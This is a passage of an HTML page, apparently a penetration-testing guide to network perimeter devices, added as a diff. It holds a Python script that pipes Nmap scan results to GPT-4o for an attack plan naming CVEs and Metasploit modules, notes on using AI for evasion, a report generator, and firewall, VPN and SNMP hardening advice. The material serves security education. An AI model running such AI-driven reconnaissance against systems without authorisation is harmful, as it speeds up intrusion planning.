+        <tr><td>GPT-4 / Claude</td><td>Code generation and analysis</td><td>Exploit code review, custom script generation, firewall rule analysis</td></tr>
+        <tr><td>Darktrace</td><td>Unsupervised ML network monitoring</td><td>Understanding what defenders see — helps attackers plan stealthier engagement approaches</td></tr>
+        <tr><td>Vectra AI</td><td>AI-driven network detection and response</td><td>Red teamers study Vectra detections to develop evasion techniques for specific behaviours</td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <div class="cb rv cb-ai" data-l="AI-Assisted — Automated Network Recon with Python + OpenAI">
+    <code><span class="cmt"># AI-augmented reconnaissance — combine Nmap output with GPT analysis</span>
+<span class="kw">import</span> subprocess, openai, json
+
+<span class="cmt"># Step 1: Run Nmap scan and capture XML output</span>
+result = subprocess.<span class="fn">run</span>([
+    <span class="str">'nmap'</span>, <span class="flag">'-sV'</span>, <span class="flag">'-oJ'</span>, <span class="str">'-'</span>, <span class="prm">target_ip</span>
+], capture_output=<span class="kw">True</span>, text=<span class="kw">True</span>)
+
+<span class="cmt"># Step 2: Feed scan results to GPT-4 for intelligent vulnerability analysis</span>
+client = openai.<span class="fn">OpenAI</span>()
+response = client.chat.completions.<span class="fn">create</span>(
+    model=<span class="str">"gpt-4o"</span>,
+    messages=[{
+        <span class="str">"role"</span>: <span class="str">"user"</span>,
+        <span class="str">"content"</span>: <span class="str">f"""
+You are an expert network penetration tester. 
+Analyse this Nmap output and:
+1. Identify the most likely attack vectors
+2. List relevant CVEs for discovered service versions
+3. Suggest specific Metasploit modules or tools to use
+4. Estimate risk level per finding
+
+Nmap output:
+{result.stdout}
+"""</span>
+    }]
+)
+
+<span class="cmt"># Step 3: Parse AI recommendations and prioritise testing workflow</span>
+<span class="fn">print</span>(response.choices[<span class="num">0</span>].message.content)
+<span class="cmt"># Output: Structured attack plan with CVE references, tool recommendations,
+# and risk-prioritised testing sequence generated in seconds</span></code>
+  </div>
+
+  <div class="cb rv cb-ai" data-l="AI — Automated Vulnerability Report Generation">
+    <code><span class="cmt"># Use AI to generate a structured vulnerability report from raw findings</span>
+<span class="kw">import</span> openai
+
+findings = [
+    {<span class="str">"vuln"</span>: <span class="str">"CVE-2018-13379"</span>, <span class="str">"device"</span>: <span class="str">"FortiGate 200D"</span>, <span class="str">"ip"</span>: <span class="str">"203.0.113.5"</span>, <span class="str">"evidence"</span>: <span class="str">"session file read returned credentials"</span>},
+    {<span class="str">"vuln"</span>: <span class="str">"Default SNMP community"</span>, <span class="str">"device"</span>: <span class="str">"Cisco 3850"</span>, <span class="str">"ip"</span>: <span class="str">"203.0.113.10"</span>, <span class="str">"evidence"</span>: <span class="str">"snmpwalk returned full routing table"</span>}
+]
+
+prompt = <span class="str">f"""
+Generate a professional penetration test finding for the following network vulnerability.
+Format as: Title | CVSS Score | Severity | Impact | Remediation Steps
+
+Findings: {json.dumps(findings, indent=2)}
+"""</span>
+
+response = openai.OpenAI().chat.completions.<span class="fn">create</span>(
+    model=<span class="str">"gpt-4o"</span>, messages=[{<span class="str">"role"</span>:<span class="str">"user"</span>,<span class="str">"content"</span>:prompt}]
+)
+<span class="fn">print</span>(response.choices[<span class="num">0</span>].message.content)</code>
+  </div>
+</section>
+
+<div class="div"></div>
+
+<!-- ══════════════════════════════════
+     09 — DEFENCE & HARDENING
+══════════════════════════════════ -->
+<section class="sec rv" id="defence">
+  <div class="sec-hd">
+    <span class="sec-n">09 //</span>
+    <h2 class="sec-t">Defence — Perimeter Device Hardening<span class="tw-cursor"></span></h2>
+    <div class="sec-ln"></div>
+  </div>
+
+  <div class="panel rv-l">
+    <p>Effective perimeter hardening requires addressing every attack vector identified in this guide simultaneously. A firewall patched against known CVEs but still running with default SNMP community strings is still trivially compromised. Defence-in-depth applies at the perimeter layer just as much as anywhere else — preventive controls, detective controls, and corrective controls must all be present and operational.</p>
+  </div>
+
+  <div class="mgrid rv">
+    <div class="mcard">
+      <div class="mcard-name">Patch &amp; Firmware Management</div>
+      <div class="mcard-desc">Maintain a documented firmware version inventory for all perimeter devices. Subscribe to vendor security advisories (Cisco PSIRT, Fortinet PSIRT, Palo Alto Unit 42). Apply Critical CVE patches within 48 hours — perimeter device CVEs are exploited faster than any other vulnerability class due to their internet exposure.</div>
+    </div>
+    <div class="mcard">
+      <div class="mcard-name">Strong Authentication</div>
+      <div class="mcard-desc">Eliminate all default credentials immediately. Enforce SSH key-based authentication for all device access — disable password authentication entirely. Implement TACACS+ or RADIUS for centralised, logged device authentication. Mandate MFA for VPN access. Remove Telnet and HTTP management access entirely — SSH and HTTPS only.</div>
+    </div>
+    <div class="mcard">
+      <div class="mcard-name">SNMP Hardening</div>
+      <div class="mcard-desc">Replace SNMPv1/v2c with SNMPv3 with authentication and privacy (AES encryption). Change all community strings from defaults. Implement ACLs restricting SNMP access to specific management station IPs only. Disable SNMP write access unless explicitly required. Consider disabling SNMP entirely and using SSH-based monitoring instead.</div>
+    </div>
+    <div class="mcard">
+      <div class="mcard-name">Disable Unnecessary Services</div>
+      <div class="mcard-desc">Apply a minimal service configuration to all perimeter devices — disable Finger, BOOTP, CDP (where not needed), proxy ARP, IP source routing, and all unused management protocols. Every enabled service is an additional attack surface. Document every enabled service with a business justification.</div>
+    </div>
+    <div class="mcard">
+      <div class="mcard-name">Network Segmentation</div>
+      <div class="mcard-desc">Isolate device management access on a dedicated out-of-band management VLAN with strict ACLs limiting access to authorised management stations only. Management traffic must never traverse the same interfaces as production traffic. Implement jump hosts for all device access — no direct management access from user subnets.</div>
+    </div>
+    <div class="mcard">
+      <div class="mcard-name">AI-Enhanced Monitoring</div>
+      <div class="mcard-desc">Deploy AI-driven network detection and response (NDR) platforms alongside traditional SIEM. AI models detect the reconnaissance, lateral movement, and exfiltration patterns that evade signature-based systems. Integrate firewall and VPN logs into a centralised SIEM with AI-powered correlation rules for anomalous authentication, unusual routing changes, and configuration modifications.</div>
+    </div>
+  </div>
+
+  <div class="dgrid rv">
+    <div class="panel" style="border-color:rgba(0,255,65,.22)">
+      <div class="panel-t" style="color:var(--g);font-size:12px">Firewall Hardening</div>
+      <ul class="chk">
+        <li><span class="chk-i"></span><span>Implement <strong>default-deny inbound and outbound</strong> policies — permit only explicitly required traffic</span></li>
+        <li><span class="chk-i"></span><span>Enable <strong>stateful packet inspection</strong> and application-layer filtering on all interfaces</span></li>
+        <li><span class="chk-i"></span><span>Log all <strong>denied connection attempts</strong> and ship to centralised SIEM for correlation</span></li>
+        <li><span class="chk-i"></span><span>Conduct <strong>quarterly firewall rule reviews</strong> — remove all rules without a current business justification</span></li>
+      </ul>
+    </div>
+    <div class="panel" style="border-color:rgba(0,229,255,.22)">
+      <div class="panel-t" style="color:var(--c);font-size:12px">VPN &amp; Remote Access</div>
+      <ul class="chk">
+        <li><span class="chk-i"></span><span>Enforce <strong>Multi-Factor Authentication</strong> for all VPN access — certificates + TOTP minimum</span></li>
+        <li><span class="chk-i"></span><span>Implement <strong>split tunnelling restrictions</strong> — route all traffic through VPN, not just corporate subnets</span></li>
+        <li><span class="chk-i"></span><span>Monitor for <strong>impossible travel</strong> — same VPN user authenticating from multiple geographies simultaneously</span></li>
+        <li><span class="chk-i"></span><span>Deploy <strong>Certificate-based client authentication</strong> — device certificates prevent credential-only compromise</span></li>
+      </ul>
+    </div>
+    <div class="panel" style="border-color:rgba(191,0,255,.22)">
+      <div class="panel-t" style="color:var(--p);font-size:12px">AI-Powered Defence</div>
+      <ul class="chk">
+        <li><span class="chk-i"></span><span>Deploy <strong>NDR / AI anomaly detection</strong> (Darktrace, Vectra, ExtraHop) on all network segments</span></li>
+        <li><span class="chk-i"></span><span>Integrate <strong>AI-driven SOAR</strong> for automated blocking, isolation, and forensic capture on detected attacks</span></li>
+        <li><span class="chk-i"></span><span>Use <strong>AI-powered threat intelligence</strong> feeds to pre-emptively block known attacker infrastructure</span></li>
+        <li><span class="chk-i"></span><span>Conduct <strong>AI-assisted red team exercises</strong> — test detection capability against AI-generated attack patterns</span></li>
+      </ul>
+    </div>
+  </div>
+</section>
+
+<!-- ══ CTA ══ -->
+<div class="cta rv">
+  <div class="cta-t">// Map the Network. Know the Perimeter. Test Everything. //</div>
+  <p class="cta-p">Network perimeter devices are the organisation's last line of defence and one of the highest-value attack targets. A single misconfigured firewall, unpatched VPN gateway, or default SNMP community string can unravel years of internal security investment. Test proactively, harden systematically, and leverage AI to scale both your offensive research and defensive detection capabilities.</p>
+  <div class="cta-btns">
+    <a href="https://github.com/nishu2402" class="btn btn-p" target="_blank" rel="noopener">GitHub — nishu2402</a>
+    <a href="https://nishu2402.github.io" class="btn btn-s" target="_blank" rel="noopener">View Portfolio</a>
+  </div>
+</div>
+
+<!-- ══ FOOTER ══ -->
+<footer class="footer">
+  <div class="f-l">
+    Nisarg Chasmawala (Shroff)<br>
+    <span class="f-alias">// HEAVEN</span>
+  </div>
+  <div class="f-r">
+    Offensive Security Engineer · MSc Cyber Security, BCU<br>
+    CEH Master · CPENT · CHFI · ISO 27001 Lead Auditor<br>
+    <a href="https://github.com/nishu2402" target="_blank" rel="noopener">github.com/nishu2402</a>
+  </div>
+</footer>
+
+</div>
+
+<script>
+/* ─── CURSOR ─── */
+const cur=document.getElementById('cur'),cur2=document.getElementById('cur2'),cur3=document.getElementById('cur3');
+let mx=0,my=0;
+document.addEventListener('mousemove',e=>{mx=e.clientX;my=e.clientY;cur.style.left=mx+'px';cur.style.top=my+'px'});
+(function loop(){cur2.style.left=mx+'px';cur2.style.top=my+'px';cur3.style.left=mx+'px';cur3.style.top=my+'px';requestAnimationFrame(loop)})();
+document.querySelectorAll('a,.btn,.vc,.tc,.atk,.mcard,.ai-card,.panel,.cb').forEach(el=>{
+  el.addEventListener('mouseenter',()=>{cur.style.width='18px';cur.style.height='18px';cur.style.background='rgba(0,255,65,.25)'});
+  el.addEventListener('mouseleave',()=>{cur.style.width='10px';cur.style.height='10px';cur.style.background='var(--g)'});
+});
+
+/* ─── PROGRESS ─── */
+window.addEventListener('scroll',()=>{document.getElementById('prog').style.width=((window.scrollY/(document.body.scrollHeight-window.innerHeight))*100)+'%'});
+
+/* ═══ PARTICLE NETWORK ═══ */
+(function(){
+  const c=document.getElementById('bg-particle'),ctx=c.getContext('2d');
+  let W,H,mouseX=innerWidth/2,mouseY=innerHeight/2;
+  const N=200,MAX=140;let P=[];
+  class Particle{
+    constructor(){this.reset(true)}
+    reset(i){this.x=Math.random()*W;this.y=i?Math.random()*H:H+10;this.z=Math.random()*3+.5;this.vx=(Math.random()-.5)*.4;this.vy=(Math.random()-.5)*.4-.1;this.life=Math.random()*300+200;this.maxLife=this.life;this.r=Math.random()*1.5+.5;const r=Math.random();this.color=r<.7?'0,255,65':r<.9?'0,229,255':'191,0,255'}
+    update(){const dx=this.x-mouseX,dy=this.y-mouseY,d=Math.sqrt(dx*dx+dy*dy);if(d<120){const f=(120-d)/120;this.vx+=dx/d*f*.6;this.vy+=dy/d*f*.6}this.vx*=.98;this.vy*=.98;this.x+=this.vx;this.y+=this.vy;this.life--;if(this.life<=0||this.x<-50||this.x>W+50||this.y<-50||this.y>H+50)this.reset(false)}
+    draw(){const a=(this.life/this.maxLife)*.7*this.z;ctx.beginPath();ctx.arc(this.x,this.y,this.r*this.z,0,Math.PI*2);ctx.fillStyle=`rgba(${this.color},${a})`;ctx.fill()}
+  }
+  function resize(){W=c.width=innerWidth;H=c.height=innerHeight}
+  function drawLines(){for(let i=0;i<P.length;i++)for(let j=i+1;j<P.length;j++){const a=P[i],b=P[j],dx=a.x-b.x,dy=a.y-b.y,d=Math.sqrt(dx*dx+dy*dy);if(d<MAX){const al=(1-d/MAX)*.18,g=ctx.createLinearGradient(a.x,a.y,b.x,b.y);g.addColorStop(0,`rgba(${a.color},${al})`);g.addColorStop(1,`rgba(${b.color},${al})`);ctx.beginPath();ctx.moveTo(a.x,a.y);ctx.lineTo(b.x,b.y);ctx.strokeStyle=g;ctx.lineWidth=(a.z+b.z)/2*.5;ctx.stroke()}}}
+  function drawRing(){const g=ctx.createRadialGradient(mouseX,mouseY,0,mouseX,mouseY,80);g.addColorStop(0,'rgba(0,255,65,0)');g.addColorStop(.7,'rgba(0,255,65,0.04)');g.addColorStop(1,'rgba(0,255,65,0)');ctx.fillStyle=g;ctx.beginPath();ctx.arc(mouseX,mouseY,80,0,Math.PI*2);ctx.fill()}
+  function animate(){ctx.clearRect(0,0,W,H);drawRing();drawLines();P.forEach(p=>{p.update();p.draw()});requestAnimationFrame(animate)}
+  resize();window.addEventListener('resize',resize);document.addEventListener('mousemove',e=>{mouseX=e.clientX;mouseY=e.clientY});
+  P=Array.from({length:N},()=>new Particle());animate();
+})();
+
+/* ═══ HEX GRID ═══ */
+(function(){
+  const c=document.getElementById('bg-hex'),ctx=c.getContext('2d');
+  let W,H,t=0;const S=40;
+  function resize(){W=c.width=innerWidth;H=c.height=innerHeight}
+  function hexPath(cx,cy,s){ctx.beginPath();for(let i=0;i<6;i++){const a=Math.PI/180*(60*i-30);i===0?ctx.moveTo(cx+s*Math.cos(a),cy+s*Math.sin(a)):ctx.lineTo(cx+s*Math.cos(a),cy+s*Math.sin(a))}ctx.closePath()}
+  function draw(){ctx.clearRect(0,0,W,H);t+=.008;const sy=window.scrollY,cols=Math.ceil(W/(S*1.732))+2,rows=Math.ceil(H/(S*1.5))+2;for(let r=-1;r<rows;r++)for(let col=-1;col<cols;col++){const cx=col*S*1.732+(r%2)*S*.866,cy=r*S*1.5-(sy*.03)%((S*1.5));const w=Math.sin(t+col*.3+r*.2)*.5+.5,p=Math.sin(t*1.4+col*.5-r*.3)*.5+.5;hexPath(cx,cy,S-2);ctx.strokeStyle=`rgba(0,255,65,${.02+w*.07})`;ctx.lineWidth=.6;ctx.stroke();if(w>.92){hexPath(cx,cy,S-2);ctx.fillStyle=`rgba(0,255,65,${.02+p*.03})`;ctx.fill()}}requestAnimationFrame(draw)}
+  resize();window.addEventListener('resize',resize);draw();
+})();
+
+/* ═══ HERO 3D — DYNAMIC NETWORK TOPOLOGY GRAPH ═══ */
+(function(){
+  const c=document.getElementById('hero-geo');if(!c)return;
+  const ctx=c.getContext('2d'),S=500;c.width=S;c.height=S;
+
+  // Build a 3D network of nodes (routers, firewalls, servers) 
+  const nodes=[
+    // Core — large central node (internet gateway)
+    {x:0,y:0,z:0,r:14,col:'0,255,65',label:'GW',speed:0},
+    // Perimeter tier
+    {x:120,y:40,z:30,r:9,col:'0,229,255',label:'FW',speed:.007},
+    {x:-110,y:50,z:20,r:9,col:'0,229,255',label:'FW',speed:-.006},
+    {x:20,y:-130,z:40,r:9,col:'0,229,255',label:'VPN',speed:.008},
+    {x:-30,y:110,z:-40,r:9,col:'191,0,255',label:'IDS',speed:-.007},
+    // Internal tier
+    {x:170,y:-50,z:-30,r:6,col:'0,255,65',label:'SRV',speed:.01},
+    {x:-160,y:-40,z:50,r:6,col:'0,255,65',label:'SRV',speed:-.009},
+    {x:80,y:160,z:20,r:6,col:'0,255,65',label:'DB',speed:.008},
+    {x:-70,y:-160,z:-30,r:6,col:'255,215,0',label:'RTR',speed:-.011},
+    {x:160,y:100,z:-60,r:6,col:'255,0,60',label:'DMZ',speed:.009},
+    {x:-140,y:120,z:60,r:6,col:'0,229,255',label:'LB',speed:-.008},
+    // Outer nodes
+    {x:210,y:30,z:0,r:4,col:'0,255,65',label:'',speed:.012},
+    {x:-200,y:-20,z:40,r:4,col:'0,255,65',label:'',speed:-.011},
+    {x:50,y:200,z:-50,r:4,col:'191,0,255',label:'',speed:.013},
+  ];
+  // Edges (adjacency)
+  const edges=[
+    [0,1],[0,2],[0,3],[0,4],
+    [1,5],[1,9],[2,6],[2,10],[3,7],[3,11],[4,8],[4,12],
+    [5,11],[6,12],[7,13],[9,10],[10,6],[8,13],[1,2],[3,4]
+  ];
+
+  let rx=0,ry=0,rz=0,mrx=0,mry=0;
+  document.addEventListener('mousemove',e=>{mrx=(e.clientY/innerHeight-.5)*.35;mry=(e.clientX/innerWidth-.5)*.45});
+
+  // Each node orbits slightly around its position
+  const basePos=nodes.map(n=>({...n}));
+
+  function rot([x,y,z],rx,ry,rz){
+    let y1=y*Math.cos(rx)-z*Math.sin(rx),z1=y*Math.sin(rx)+z*Math.cos(rx);
+    let x2=x*Math.cos(ry)+z1*Math.sin(ry),z2=-x*Math.sin(ry)+z1*Math.cos(ry);
+    let x3=x2*Math.cos(rz)-y1*Math.sin(rz),y3=x2*Math.sin(rz)+y1*Math.cos(rz);
+    return[x3,y3,z2];
+  }
+  function proj([x,y,z]){const f=440,d=f/(f+z+220);return[x*d+S/2,y*d+S/2,z]}
+
+  let t=0;
+  function draw(){
+    ctx.clearRect(0,0,S,S);
+    t+=0.012;
+    rx+=.003+mrx*.008;ry+=.006+mry*.01;rz+=.002;
+
+    // Animate each node slightly around its base position
+    const animated=basePos.map((n,i)=>{
+      const wobble=i%2===0?1:-1;
+      return{
+        x:n.x+Math.sin(t*n.speed*10+i)*8*wobble,
+        y:n.y+Math.cos(t*n.speed*8+i)*6,
+        z:n.z+Math.sin(t*n.speed*6+i)*5,
+        r:n.r,col:n.col
+      };
+    });
+
+    const projected=animated.map(n=>proj(rot([n.x,n.y,n.z],rx,ry,rz)));
+
+    // Draw edges with data-flow animation
+    edges.forEach(([a,b])=>{
+      const pa=projected[a],pb=projected[b];
+      const dep=((pa[2]+pb[2])/(2*220)+1)/2;
+      const na=animated[a],nb=animated[b];
+      const col=na.col;
+      const al=0.05+dep*.4;
+      const g=ctx.createLinearGradient(pa[0],pa[1],pb[0],pb[1]);
+      g.addColorStop(0,`rgba(${col},${al})`);
+      g.addColorStop(1,`rgba(${nb.col},${al*0.6})`);
+      ctx.beginPath();ctx.moveTo(pa[0],pa[1]);ctx.lineTo(pb[0],pb[1]);
+      ctx.strokeStyle=g;ctx.lineWidth=0.5+dep*.7;ctx.stroke();
+
+      // Animated data packet travelling along edge
+      const progress=(t*0.3+a*0.7)%1;
+      const px=pa[0]+(pb[0]-pa[0])*progress;
+      const py=pa[1]+(pb[1]-pa[1])*progress;
+      ctx.beginPath();ctx.arc(px,py,1.5*dep,0,Math.PI*2);
+      ctx.fillStyle=`rgba(${col},${dep*0.8})`;ctx.fill();
+    });
+
+    // Draw nodes
+    projected.forEach(([px,py,pz],i)=>{
+      const n=animated[i];
+      const dep=(pz+220)/440;if(dep<0.15)return;
+      const r=n.r*dep;
+
+      // Node glow
+      const grd=ctx.createRadialGradient(px,py,0,px,py,r*4);
+      grd.addColorStop(0,`rgba(${n.col},${dep*0.25})`);
+      grd.addColorStop(1,`rgba(${n.col},0)`);
+      ctx.fillStyle=grd;ctx.beginPath();ctx.arc(px,py,r*4,0,Math.PI*2);ctx.fill();
+
+      // Node body
+      ctx.beginPath();ctx.arc(px,py,r,0,Math.PI*2);
+      ctx.fillStyle=`rgba(${n.col},${dep*0.85})`;ctx.fill();
+      ctx.strokeStyle=`rgba(255,255,255,${dep*0.25})`;ctx.lineWidth=0.5;ctx.stroke();
+    });
+
+    // Central glow
+    const g=ctx.createRadialGradient(S/2,S/2,0,S/2,S/2,55);
+    g.addColorStop(0,'rgba(0,255,65,0.12)');g.addColorStop(1,'rgba(0,255,65,0)');
+    ctx.fillStyle=g;ctx.beginPath();ctx.arc(S/2,S/2,55,0,Math.PI*2);ctx.fill();
+    requestAnimationFrame(draw);
+  }
+  draw();
+})();
+
+/* ═══ 3D TILT ON VULN CARDS ═══ */
+document.querySelectorAll('.vc').forEach(card=>{
+  card.addEventListener('mousemove',e=>{
+    const r=card.getBoundingClientRect(),x=(e.clientX-r.left)/r.width-.5,y=(e.clientY-r.top)/r.height-.5;
+    card.style.transform=`perspective(700px) rotateX(${-y*16}deg) rotateY(${x*16}deg) translateZ(12px) scale(1.03)`;
+    card.style.boxShadow=`${-x*24}px ${-y*24}px 50px rgba(191,0,255,.18),0 24px 60px rgba(0,0,0,.4)`;
+  });
+  card.addEventListener('mouseleave',()=>{
+    card.style.transform='perspective(700px) rotateX(0) rotateY(0) translateZ(0) scale(1)';
+    card.style.boxShadow='';card.style.transition='transform .4s,box-shadow .4s';
+    setTimeout(()=>card.style.transition='',400);
+  });
+});
+
+/* ═══ SCROLL REVEAL ═══ */
+const rv=new IntersectionObserver(e=>e.forEach(x=>{if(x.isIntersecting)x.target.classList.add('on')}),{threshold:.08});
+document.querySelectorAll('.rv,.rv-l').forEach(el=>rv.observe(el));
+
+/* ═══ TOC TRACKING ═══ */
+const sIds=['hero','what','perimeter','recon','scan','exploit','pivot','exfil','ai','defence'];
+const tItems=document.querySelectorAll('.toc-i');
+const so=new IntersectionObserver(e=>{e.forEach(x=>{if(x.isIntersecting)tItems.forEach(t=>t.classList.toggle('active',t.dataset.s===x.target.id))})},{threshold:.25});
+sIds.forEach(id=>{const el=document.getElementById(id);if(el)so.observe(el)});
+function goTo(h){document.querySelector(h)?.scrollIntoView({behavior:'smooth'})}
+
+/* ═══ CODE COPY ═══ */
+document.querySelectorAll('.cb').forEach(b=>{
+  b.title='Click to copy';
+  b.addEventListener('click',()=>{
+    navigator.clipboard.writeText(b.querySelector('code').innerText).catch(()=>{});
+    const o=b.getAttribute('data-l');b.setAttribute('data-l',o+' ✓ COPIED');
+    setTimeout(()=>b.setAttribute('data-l',o),2000);
+  });
+});
+</script>
+</body>
+</html>
